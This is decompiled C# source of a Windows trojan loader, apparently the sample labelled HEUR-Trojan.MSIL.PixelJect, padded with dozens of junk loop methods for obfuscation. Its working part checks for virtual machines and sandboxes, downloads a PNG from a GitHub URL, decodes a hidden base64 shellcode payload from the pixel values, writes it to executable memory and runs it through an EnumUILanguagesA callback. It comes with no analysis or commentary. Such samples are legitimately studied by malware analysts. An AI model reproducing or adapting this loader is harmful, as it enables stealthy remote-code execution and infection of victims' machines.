// Decompiled with JetBrains decompiler
// Type: qwq.Program
// Assembly: TryHard, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BE62B1E6-D205-47B8-AF1F-2C2088F92A34
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.PixelJect.gen-72db091c5f361d928bc1a3c1578bacdc9d7862a0aabcdc0a68d5ee7fc7cb8524.exe

using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace qwq
{
  internal class Program
  {
    private static double aqSwKZahugSwqANRWAXnCIMjjEGupqqvPtsRbEDAXArBc;
    private static bool[] KMGeZOaWqMv;
    private static sbyte DDHIPqvndKfWucvHElppTUQWRMJgtkuk;
    private static int[] zwUlyQxzGRiKUsSuYOqqXcydnkxiKnrC;
    private static Decimal[] RzgXXrUBqihofuaOtNThyjKbahHzaJQeOafiMudqXFFLzZKK;

    private void dULplYGCHSEApPqNumrpbsaFqjDVZOXeCuuYVmWyXqxX_func()
    {
      int num1 = 0;
      while ((ulong) (uint) num1 > 10868057586810329712UL)
        ++num1;
      int num2 = 0;
      while ((uint) num2 < 484805292U)
        ++num2;
      int num3 = 0;
      while ((uint) num3 < 3356975631U)
        ++num3;
    }

    private void mBnyKUQvJXiLlXHSzhGyhkwzrZmoMyFjSPrOq_func()
    {
      int num1 = 0;
      while ((ulong) (uint) num1 <= 17098853225105948218UL)
        ++num1;
      for (int index = 0; (uint) index >= 732140153U; ++index)
      {
        int num2 = 0;
        while ((uint) num2 > 573877957U)
          ++num2;
      }
    }

    private void XdcljtbPUBoECF_func()
    {
      int num1 = 0;
      while ((ulong) (uint) num1 <= 15823912717177962704UL)
        ++num1;
      for (int index = 0; (uint) index <= 2429487702U; ++index)
      {
        int num2 = 0;
        while ((ulong) (uint) num2 > 13346202200431177209UL)
          ++num2;
      }
      for (int index = 0; (uint) index > 131440726U; ++index)
      {
        int num3 = 0;
        while ((uint) num3 < 4292305786U)
          ++num3;
        int num4 = 0;
        while ((ulong) (uint) num4 > 17123509502448979550UL)
          ++num4;
        int num5 = 0;
        while ((ulong) (uint) num5 < 13691280046314981620UL)
          ++num5;
      }
      int num6 = 0;
      while ((uint) num6 < 1403821971U)
        ++num6;
    }

    private void yhEDxOvQLcENmHdoLxpRWqDLFuE_func()
    {
      int num1 = 0;
      while ((ulong) (uint) num1 <= 13459564166721897659UL)
        ++num1;
      int num2 = 0;
      while ((ulong) (uint) num2 <= 15200325082178034011UL)
        ++num2;
      int num3 = 0;
      while ((uint) num3 < 3882248040U)
        ++num3;
      int num4 = 0;
      while ((uint) num4 >= 3213651671U)
        ++num4;
    }

    private static void Main()
    {
      if (!Program.IsServerVersion() && Program.VM())
        return;
      AppDomain.CreateDomain("TempDomain").DoCallBack(new CrossAppDomainDelegate(Program.Load));
    }

    private void wAmkHRnIwIyTOznADOzosZybSsBGYpYifDTNLncCeR_func()
    {
      for (int index = 0; (ulong) (uint) index <= 9544271350275795335UL; ++index)
      {
        int num1 = 0;
        while ((ulong) (uint) num1 < 12074242768275337427UL)
          ++num1;
        int num2 = 0;
        while ((ulong) (uint) num2 > 10473640049165737808UL)
          ++num2;
      }
    }

    private void jMAvPvyyUQNcrDRyUnkRhdwehXSlufoZNoElFsJHUJOkxYqYAP_func()
    {
      for (int index = 0; (ulong) (uint) index <= 16966777220409703167UL; ++index)
      {
        int num = 0;
        while ((uint) num <= 259630539U)
          ++num;
      }
      for (int index = 0; (uint) index > 3637423194U; ++index)
      {
        int num1 = 0;
        while ((uint) num1 > 1454861313U)
          ++num1;
        int num2 = 0;
        while ((ulong) (uint) num2 >= 9246746742662941943UL)
          ++num2;
        int num3 = 0;
        while ((ulong) (uint) num3 < 12437340842538765885UL)
          ++num3;
        int num4 = 0;
        while ((uint) num4 > 1326246875U)
          ++num4;
      }
    }

    private void yeWwhCEsimiBYcOrRXajsrPDclRgpLtGygJbAeBm_func()
    {
      int num1 = 0;
      while ((ulong) (uint) num1 >= 16595722005834078877UL)
        ++num1;
      int num2 = 0;
      while ((ulong) (uint) num2 > 13340404736733640959UL)
        ++num2;
      for (int index = 0; (ulong) (uint) index >= 9590604125138374933UL; ++index)
      {
        int num3 = 0;
        while ((ulong) (uint) num3 < 14627412373254807211UL)
          ++num3;
      }
      int num4 = 0;
      while ((uint) num4 < 153740422U)
        ++num4;
    }

    private void zFITJZXwzKXiMabbfIyRih_func()
    {
      int num1 = 0;
      while ((ulong) (uint) num1 > 12285352884684475866UL)
        ++num1;
      int num2 = 0;
      while ((uint) num2 >= 1404393624U)
        ++num2;
      for (int index = 0; (ulong) (uint) index > 17107354861650432638UL; ++index)
      {
        int num3 = 0;
        while ((uint) num3 <= 84250756U)
          ++num3;
        int num4 = 0;
        while ((uint) num4 > 2729821367U)
          ++num4;
      }
    }

    public static bool IsServerVersion() => new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get().OfType<ManagementObject>().Select<ManagementObject, uint>((Func<ManagementObject, uint>) (o => (uint) o.GetPropertyValue("ProductType"))).First<uint>() != 1U;

    private void gECkNHICOxEssFLbCqjLWSqFdXtddwrE_func()
    {
      int num1 = 0;
      while ((ulong) (uint) num1 >= 16763478358673135885UL)
        ++num1;
      int num2 = 0;
      while ((ulong) (uint) num2 > 13530688121865036444UL)
        ++num2;
    }

    private void yoabbqsgzj_func()
    {
      int num1 = 0;
      while ((uint) num1 <= 420946246U)
        ++num1;
      for (int index = 0; (uint) index <= 3427995153U; ++index)
      {
        int num2 = 0;
        while ((uint) num2 > 1238437238U)
          ++num2;
      }
      for (int index = 0; (uint) index < 3471482991U; ++index)
      {
        int num3 = 0;
        while ((uint) num3 <= 3735346019U)
          ++num3;
        int num4 = 0;
        while ((ulong) (uint) num4 >= 14700596466392207844UL)
          ++num4;
      }
    }

    private void XNiUPBXytQwSRPIRILUK_func()
    {
      int num1 = 0;
      while ((ulong) (uint) num1 <= 17354242920853680578UL)
        ++num1;
      for (int index = 0; (uint) index > 1453931407U; ++index)
      {
        int num2 = 0;
        while ((uint) num2 < 242098104U)
          ++num2;
        int num3 = 0;
        while ((uint) num3 < 1620674154U)
          ++num3;
      }
    }

    private void IpNQLsKgSXWHEdknjaWABoB_func()
    {
      int num1 = 0;
      while ((uint) num1 > 3181178034U)
        ++num1;
      int num2 = 0;
      while ((uint) num2 < 879325144U)
        ++num2;
      int num3 = 0;
      while ((ulong) (uint) num3 <= 10488444167779325603UL)
        ++num3;
      int num4 = 0;
      while ((uint) num4 > 3071455204U)
        ++num4;
    }

    public static bool VM()
    {
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher((ObjectQuery) new SelectQuery("Select * from Win32_CacheMemory"));
      int num = 0;
      foreach (ManagementObject managementObject in managementObjectSearcher.Get())
        ++num;
      return num == 0;
    }

    private void AkQGZYwDTkcblTHbWhPyWrqQvyervhLOKvphceQnmaJhc_func()
    {
      int num1 = 0;
      while ((uint) num1 < 3306523212U)
        ++num1;
      int num2 = 0;
      while ((ulong) (uint) num2 > 13702451333387997350UL)
        ++num2;
      int num3 = 0;
      while ((uint) num3 >= 1023190661U)
        ++num3;
    }

    private void aacjBorXHtgg_func()
    {
      for (int index = 0; (uint) index < 2762580220U; ++index)
      {
        int num = 0;
        while ((uint) num >= 2120434598U)
          ++num;
      }
    }

    private void OCMHvNfZuysZfnlpDuiDYhROEkTMWVqbZClroqRmaqFTScjHz_func()
    {
      int num1 = 0;
      while ((uint) num1 < 2381838634U)
        ++num1;
      int num2 = 0;
      while ((ulong) (uint) num2 < 10470150844978663391UL)
        ++num2;
      int num3 = 0;
      while ((ulong) (uint) num3 > 16570850280950737834UL)
        ++num3;
      for (int index = 0; (uint) index >= 895881636U; ++index)
      {
        int num4 = 0;
        while ((ulong) (uint) num4 <= 10970121637936440291UL)
          ++num4;
        int num5 = 0;
        while ((uint) num5 > 176541443U)
          ++num5;
      }
      int num6 = 0;
      while ((ulong) (uint) num6 > 13187246105727881051UL)
        ++num6;
      for (int index = 0; (uint) index < 3544420324U; ++index)
      {
        int num7 = 0;
        while ((uint) num7 > 2890132694U)
          ++num7;
        int num8 = 0;
        while ((uint) num8 >= 3480880909U)
          ++num8;
      }
    }

    private void vSJqGswaPGBjCmVQgyoFQSxODALmeeNUOeffvHhGkBD_func()
    {
      int num1 = 0;
      while ((ulong) (uint) num1 > 15938076292390888419UL)
        ++num1;
      for (int index = 0; (uint) index > 1513508527U; ++index)
      {
        int num2 = 0;
        while ((ulong) (uint) num2 < 9755416368740933458UL)
          ++num2;
        int num3 = 0;
        while ((uint) num3 < 2059603809U)
          ++num3;
        int num4 = 0;
        while ((uint) num4 < 2774458117U)
          ++num4;
        int num5 = 0;
        while ((uint) num5 > 2613805233U)
          ++num5;
      }
      int num6 = 0;
      while ((ulong) (uint) num6 > 10335608697066873382UL)
        ++num6;
      int num7 = 0;
      while ((uint) num7 < 434345681U)
        ++num7;
    }

    [DllImport("kernel32.dll")]
    private static extern int VirtualAllocExNuma(
      IntPtr hProcess,
      int lpAddress,
      int dwSize,
      int flAllocationType,
      int flProtect,
      int nndPreferred);

    private void OaWYxtRXXWtmfHfBVJIzUVCKRbFzpqGjGVlSAj_func()
    {
      int num1 = 0;
      while ((ulong) (uint) num1 < 17084540861628786314UL)
        ++num1;
      int num2 = 0;
      while ((ulong) (uint) num2 > 12901825812708941600UL)
        ++num2;
    }

    private void ZpfRWCzRVRzeVWqFrjVdEWcBXCuZojAlderat_func()
    {
      int num = 0;
      while ((uint) num < 3601392698U)
        ++num;
    }

    private void xwsJAtsDDRRtsEfcnMCCIsHIKluZUbgBDRZavhVFoseKegdc_func()
    {
      int num1 = 0;
      while ((uint) num1 < 823969096U)
        ++num1;
      int num2 = 0;
      while ((uint) num2 >= 3240913870U)
        ++num2;
      int num3 = 0;
      while ((uint) num3 < 513316878U)
        ++num3;
      int num4 = 0;
      while ((uint) num4 >= 2951241969U)
        ++num4;
    }

    private void LffYZpljDJoeip_func()
    {
      int num1 = 0;
      while ((uint) num1 < 675808076U)
        ++num1;
      int num2 = 0;
      while ((uint) num2 < 4055161744U)
        ++num2;
    }

    public static byte[] depixelate(Bitmap img)
    {
      StringBuilder stringBuilder = new StringBuilder();
      int num1 = img.Width - 1;
      int num2 = img.Height - 1;
      for (int y = 1; y <= num2; ++y)
      {
        for (int x = 1; x <= num1; ++x)
        {
          Color pixel = img.GetPixel(x, y);
          stringBuilder.Append((char) pixel.R);
        }
      }
      return Convert.FromBase64String(stringBuilder.ToString().Replace(Convert.ToChar(0).ToString(), ""));
    }

    private void hSNPWhFJtOPEKvaibCCPBvpgzodLXCdrBblPCZPdGXrpXEPKik_func()
    {
      int num1 = 0;
      while ((uint) num1 <= 1017956494U)
        ++num1;
      int num2 = 0;
      while ((uint) num2 <= 2480828615U)
        ++num2;
    }

    private void epXRnCtoFda_func()
    {
      int num1 = 0;
      while ((uint) num1 < 2952486363U)
        ++num1;
      for (int index = 0; (uint) index < 257460983U; ++index)
      {
        int num2 = 0;
        while ((ulong) (uint) num2 < 9403306209895239503UL)
          ++num2;
      }
      for (int index = 0; (ulong) (uint) index >= 18110200713358632519UL; ++index)
      {
        int num3 = 0;
        while ((uint) num3 < 4275553490U)
          ++num3;
        int num4 = 0;
        while ((ulong) (uint) num4 <= 15305441680095166672UL)
          ++num4;
      }
    }

    private void bQzimMbgMhPBfNLzXK_func()
    {
      int num1 = 0;
      while ((ulong) (uint) num1 > 11744072933090172939UL)
        ++num1;
      int num2 = 0;
      while ((ulong) (uint) num2 > 12671416690824309429UL)
        ++num2;
      for (int index = 0; (uint) index <= 766032272U; ++index)
      {
        int num3 = 0;
        while ((uint) num3 <= 2458036170U)
          ++num3;
        int num4 = 0;
        while ((ulong) (uint) num4 <= 9643791194850416809UL)
          ++num4;
        int num5 = 0;
        while ((ulong) (uint) num5 > 17076316327375975825UL)
          ++num5;
      }
    }

    private void KbsjDjtpDtGHguBwZXNLtJYsuQZjWXdfeuuRqoc_func()
    {
      int num1 = 0;
      while ((ulong) (uint) num1 >= 17274786352066953868UL)
        ++num1;
      int num2 = 0;
      while ((ulong) (uint) num2 <= 12073286975874958294UL)
        ++num2;
      for (int index = 0; (ulong) (uint) index >= 13400232718267679849UL; ++index)
      {
        int num3 = 0;
        while ((uint) num3 >= 3578957243U)
          ++num3;
      }
      int num4 = 0;
      while ((ulong) (uint) num4 >= 16405668946261433400UL)
        ++num4;
      int num5 = 0;
      while ((ulong) (uint) num5 <= 15826620124289130491UL)
        ++num5;
    }

    private static void Load()
    {
      if ((ValueType) Program.VirtualAllocExNuma(Process.GetCurrentProcess().Handle, 0, 1000, 12288, 64, 0) == null)
        return;
      Bitmap img;
      using (WebResponse response = WebRequest.Create("https://github.com/ZL3FH9/pictures/raw/main/zip.png").GetResponse())
      {
        using (Stream responseStream = response.GetResponseStream())
          img = (Bitmap) Image.FromStream(responseStream);
      }
      byte[] pay = Program.depixelate(img);
      IntPtr num = Program.VirtualAlloc(IntPtr.Zero, (uint) pay.Length, Program.AllocationType.Commit, Program.MemoryProtection.ExecuteReadWrite);
      Program.RtlMoveMemory(num, pay, (uint) pay.Length);
      Program.EnumUILanguagesA(num, 0U, IntPtr.Zero);
    }

    private void RfMSgVHNXTVEqecMG_func()
    {
      int num1 = 0;
      while ((uint) num1 >= 4228760207U)
        ++num1;
      int num2 = 0;
      while ((ulong) (uint) num2 >= 14813626264430198822UL)
        ++num2;
      for (int index = 0; (ulong) (uint) index > 11289333828190877707UL; ++index)
      {
        int num3 = 0;
        while ((ulong) (uint) num3 > 11846760107004210048UL)
          ++num3;
        int num4 = 0;
        while ((uint) num4 <= 2454094932U)
          ++num4;
      }
      int num5 = 0;
      while ((ulong) (uint) num5 > 14127648918323307395UL)
        ++num5;
      int num6 = 0;
      while ((ulong) (uint) num6 >= 11463277143667289241UL)
        ++num6;
    }

    private void WouDRWlEkLuuvpFMXfzzYETKdfVMx_func()
    {
    }

    private void fDHDamaOIHClExRtEeYogJtrnijjTlLEiwYTUzteyr_func()
    {
      int num1 = 0;
      while ((uint) num1 >= 474265061U)
        ++num1;
      int num2 = 0;
      while ((uint) num2 >= 4012745667U)
        ++num2;
    }

    private void saEYoMaxmoxQe_func()
    {
      int num = 0;
      while ((uint) num >= 1160520702U)
        ++num;
    }

    [DllImport("ntdll.dll")]
    private static extern bool RtlMoveMemory(IntPtr addr, byte[] pay, uint size);

    [DllImport("kernelbase.dll")]
    public static extern IntPtr VirtualAlloc(
      IntPtr lpAddress,
      uint dwSize,
      Program.AllocationType flAllocationType,
      Program.MemoryProtection flProtect);

    [DllImport("kernel32.dll")]
    private static extern bool EnumUILanguagesA(
      IntPtr lpUILanguageEnumProc,
      uint dwFlags,
      IntPtr lParam);

    [System.Flags]
    public enum AllocationType
    {
      Commit = 4096, // 0x00001000
    }

    [System.Flags]
    public enum MemoryProtection
    {
      ExecuteReadWrite = 64, // 0x00000040
    }
  }
}
